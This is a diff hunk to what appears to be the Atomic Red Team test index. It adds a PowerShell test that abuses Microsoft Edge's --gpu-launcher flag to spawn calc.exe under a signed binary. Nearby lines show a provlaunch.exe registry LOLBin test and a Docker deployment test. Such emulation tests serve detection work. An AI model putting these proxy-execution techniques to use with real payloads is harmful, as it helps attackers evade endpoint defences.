@@ -18028,6 +18028,26 @@ Registry keys are deleted after successful execution.
 reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe
 c:\windows\system32\provlaunch.exe LOLBin
 ",command_prompt,,,,,,
+T1218,Signed Binary Proxy Execution,LOLBAS Msedge to Spawn Process,e5eedaed-ad42-4c1e-8783-19529738a349,"Executes a process under a trusted Microsoft signed binary,mseddge. This test will spawn ""calc.exe"" as a child process of msedge.exe
+- https://lolbas-project.github.io/lolbas/Binaries/Msedge/
+",windows,,,"$edgePath64 = ""C:\Program Files\Microsoft\Edge\Application\msedge.exe""
+if (Test-Path $edgePath64) {
+    $edgePath = $edgePath64
+} else {
+    # Check 32-bit Edge installation path
+    $edgePath32 = ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""
+    if (Test-Path $edgePath32) {
+        $edgePath = $edgePath32
+    } else {
+        exit 1
+    }
+}
+& $edgePath --disable-gpu-sandbox --gpu-launcher=""C:\\Windows\\System32\\calc.exe &&""
+sleep 5
+taskkill -f -im msedge.exe
+taskkill -f -im calc.exe
+taskkill -f -im win32calc.exe
+",powershell,,,,,,
 T1610,Deploy a container,Deploy Docker container,59aa6f26-7620-417e-9318-589e0fb7a372,"Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime. They can do this using docker create and docker start commands. Kinsing & Doki was exploited using this technique. 
 ",containers,,,"docker build -t t1610 $PathtoAtomicsFolder/T1610/src/
 docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
